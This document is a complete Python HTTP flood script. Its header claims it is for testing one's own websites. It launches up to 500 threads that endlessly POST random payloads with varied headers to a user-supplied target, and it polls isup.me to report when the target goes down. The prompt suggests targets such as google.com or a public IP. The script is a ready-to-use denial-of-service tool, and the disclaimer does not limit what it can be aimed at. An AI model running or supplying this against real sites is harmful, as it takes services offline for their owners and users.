# -*- coding: utf-8 -*-
# Script created for testing your own websites
# by Alexey Privalov | www.alex0007.ru

import string
import threading
import urllib.parse
import urllib.request
import time
import random
import sys

# Global variables
thread_limit = 500  # Number of threads
user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1734.5 Safari/537.36"
# Global variables end


class Flooder(threading.Thread):
    str_target = None
    global target, user_agent

    def __init__(self):
        threading.Thread.__init__(self)
        self.str_target = target.scheme+"://"+target.netloc+target.path

    def run(self):
        try:
            while True:
                randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(100))
                q1 = str(round(random.uniform(0.5, 0.7), 1))
                q2 = str(round(random.uniform(0.7, 1), 1))
                cur_header = {
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain; q=" + q1 + ", text/html, "
                              "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
                    "Connection": "Keep-Alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "User-agent": user_agent
                }
                req = urllib.request.Request(self.str_target, data=str.encode(randstr), headers=cur_header)
                urllib.request.urlopen(req)
        except:
            pass


class Checker(threading.Thread):
    current_sec = None

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            if time.localtime().tm_sec % 15 == 0 and self.current_sec != time.localtime().tm_sec:
                self.current_sec = time.localtime().tm_sec
                try:
                    req = urllib.request.Request("http://isup.me/"+target.netloc+target.path)
                    if urllib.request.urlopen(req).read().decode().find("It's just you") > 0:
                        status = "up"
                    else:
                        status = "down"
                    print("The website is", status)
                except:
                    print("Can't check website status")

#  some input url preparations
if len(sys.argv) == 2:
    target = sys.argv[1]
else:
    print('Enter target url or IP ( e.g. "http://google.com" or "http://195.208.0.133"):')
    target = input()

target = urllib.parse.urlparse(target + '/')

if target.netloc.__len__() == 0:
    print("Incorrect url input")
    exit()
#  preparations ended / threads starting

print("Flooding %s" % target.netloc)
Checker().start()
while True:
    if threading.active_count() <= thread_limit:
        Flooder().start()
